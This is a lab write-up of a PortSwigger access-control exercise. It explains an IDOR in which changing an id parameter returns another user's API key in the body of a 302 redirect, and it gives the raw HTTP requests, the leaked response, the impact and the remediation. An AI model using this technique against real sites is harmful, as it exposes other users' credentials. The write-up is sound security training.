# User ID controlled by request parameter with data leakage in redirect

**Category:** Access control / IDOR
**Level:** Apprentice
**Mechanism:** IDOR — sensitive data leaked in a redirect response body

**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

---

## Vulnerability

The account page selects whose data to return from a user-controlled `id`, the same
IDOR as the earlier labs. Here the app *tries* to enforce access control by redirecting
(`302`) to the home page when you request another user's `id` — but it builds the full
account page body **before** redirecting and sends that body with the `302`. The
redirect is a client-side control only: the sensitive data still leaks in the response.

## Reconnaissance & Exploitation

Logged in as `wiener:peter`, my account loaded with my username in `id` and returned my
data in a `200`:

```http
GET /my-account?id=wiener HTTP/2
→ 200 OK  ...  Your API Key is: Bki4RQMLYBj2bp1H29MVyZ2gix3L8bET
```

Changing `id=wiener` to `id=carlos` returned a `302` redirect to the home page — in a
browser you'd just land on `/` and see nothing. But the raw `302` response still
contains the fully-rendered account body, including carlos's API key:

```http
GET /my-account?id=carlos HTTP/2
Host: 0a19000303a930368436d9d2009900c0.web-security-academy.net
Cookie: session=<redacted>
```

```http
HTTP/2 302 Found
Location: /
Content-Length: 3717

...
Your username is: carlos
Your API Key is: IhVXOXqLXsnYCDErKUnkZYVRUVjCNmsp
...
```

Submitting carlos's API key solved the lab. The redirect only tells the *browser* to go
elsewhere; the server already did the unauthorised lookup and shipped the data in the
body. Reading the raw response in Burp (instead of letting the browser follow the
redirect) exposes it.

## Impact

Any user's account data is readable by anyone who changes the `id`, despite the
redirect that was meant to block it. The "protection" is cosmetic: it hides the data
from a normal browser but not from anyone inspecting the response. An attacker harvests
API keys (and any other account data) for every enumerable user. Authentication worked;
authorisation was absent, and the redirect created a false appearance of control.

## Remediation

- Enforce authorisation **before** doing the work: check the session owns the requested
  `id` and return `403`/empty *without ever building or sending* the protected body.
- Never rely on a redirect (a client-side instruction) to protect data — the server
  must not place sensitive content in a response the user isn't authorised to see.
- Prefer deriving the account from the session, removing the `id` parameter entirely.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key); CWE-200 (Exposure of Sensitive Information)

## Notes

- Always read the **raw** response, not the rendered page. A `3xx` redirect can still
  carry a full body — the browser discards it, Burp shows it. Data leaks hide here
  constantly.
- A redirect is a suggestion to the client, not server-side enforcement. If the server
  computed and sent the data, access control already failed, whatever the status code.
- Same root cause as the other IDOR labs (no ownership check on `id`); the twist is the
  `302` dressing it up as "handled".